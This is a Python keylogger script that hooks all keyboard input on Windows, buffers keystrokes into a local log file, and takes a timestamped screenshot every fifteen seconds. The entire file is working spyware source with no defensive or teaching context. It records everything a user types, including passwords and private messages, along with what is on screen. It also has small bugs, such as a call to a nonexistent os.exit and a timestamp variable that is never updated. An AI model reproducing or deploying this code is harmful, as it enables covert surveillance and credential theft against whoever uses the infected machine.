import pyHook
import pythoncom
from datetime import *
import os
import pyautogui as screen
import threading


buffer = ""
pause_period = 2
cap_period = 15

last_press = datetime.now()
pause_delta = timedelta(seconds=pause_period)

root_dir = os.path.split(os.path.realpath(__file__))[0]
log_file = os.path.join(root_dir, "log_file.txt")
caps_dir = os.path.join(root_dir, "screencaps")

log_semaphore = threading.Semaphore()
name = "keylog"

def log(message):
	if len(message) > 0:

		log_semaphore.acquire()
		with open(log_file, "a") as f:
			write = "{}:\t{}\n".format(datetime.now(), message)
			f.write(write)
			#print(write)

		log_semaphore.release()

def screenshot():
	if not os.path.exists(caps_dir):
		os.mkdir(caps_dir)

	filename = os.path.join(caps_dir, "screen_"+datetime.now().strftime("%Y_%m_%d_%H_%M_%S")+".png")
	screen.screenshot(filename)
	log("---Screeshot taken: saved to {}---".format(filename))

	threading.Timer(cap_period, screenshot).start()

def keypress(event):
	global buffer, last_press

	if event.KeyID:
		char = chr(event.KeyID)

		if str(char) == "~":
			log(buffer)
			log("--PROGRAM ENDED--")
			os.exit(1)

		pause = datetime.now()-last_press
		if pause >= pause_delta:
			log(buffer)
			buffer=""

		if event.Ascii==13:
			buffer += "<ENTER>\n"
		elif event.Ascii==8:
			buffer += "<BACKSPACE>"
		elif event.Ascii==9:
			buffer += "<TAB>"
		else:
			buffer += char

		last_log = datetime.now()
		return True
	return False



hm = pyHook.HookManager()
hm.KeyDown = keypress
hm.HookKeyboard()
keylog = threading.Thread(target=pythoncom.PumpMessages,name=name)

log("--PROGRAM STARTED--")
screenshot()
keylog.run()
